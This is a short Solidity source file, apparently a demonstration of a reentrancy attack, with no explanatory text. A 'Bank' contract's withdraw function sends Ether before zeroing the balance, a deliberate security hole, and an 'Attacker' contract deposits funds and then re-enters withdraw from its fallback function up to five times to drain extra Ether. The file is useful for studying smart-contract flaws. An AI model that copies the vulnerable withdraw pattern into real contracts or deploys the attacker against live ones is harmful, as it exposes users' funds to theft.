pragma solidity ^0.4.15;

contract Bank {
    mapping (address => uint256) public balances;

    function wallet() constant public returns (uint256 result) {
        return this.balance;
    }

    function recharge() payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() {
        msg.sender.call.value(balances[msg.sender])();
        balances[msg.sender] = 0;
    }
}

contract Attacker {
    event receive_log(address sender, uint256 amount);

    address public bankAddr;
    uint256 attackCount = 0;

    function Attacker(address _bank) {
        bankAddr = _bank;
    }

    function attack() payable {
        attackCount = 0;
        Bank bank = Bank(bankAddr);
        bank.recharge.value(msg.value)();
        bank.withdraw();
    }

    function () payable {
        if (msg.sender == bankAddr && attackCount < 5) {

            receive_log(msg.sender, msg.value);

            attackCount += 1;
            Bank bank = Bank(bankAddr);
            bank.withdraw();
        }
    }

    function wallet() constant returns (uint256 result) {
        return this.balance;
    }
}